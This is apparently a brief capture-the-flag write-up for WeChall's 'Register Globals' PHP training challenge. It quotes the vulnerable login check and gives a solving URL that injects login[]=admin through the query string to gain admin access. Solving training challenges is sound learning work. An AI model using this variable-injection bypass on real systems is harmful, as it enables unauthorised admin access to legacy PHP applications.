
* 题目
``` 

This challenge is a relict of old PHP times, where register globals has been enabled by default, which often lead to security issues.
Again, your job is to login as admin, and you are given the sourcecode as well as highlighted version.

Here is the link to the vulnerable script.
I have also setup a test account: test:test

Enjoy!
```

* 题解
``` 
if (isset($login))
{
	echo GWF_HTML::message('Register Globals', $chall->lang('msg_welcome_back', array(htmlspecialchars($login[0]), htmlspecialchars($login[1]))));
	if (strtolower($login[0]) === 'admin') {
		$chall->onChallengeSolved(GWF_Session::getUserID());
	}
}
```
* 解决
> www.wechall.net/challenge/training/php/globals/globals.php?login[]=admin
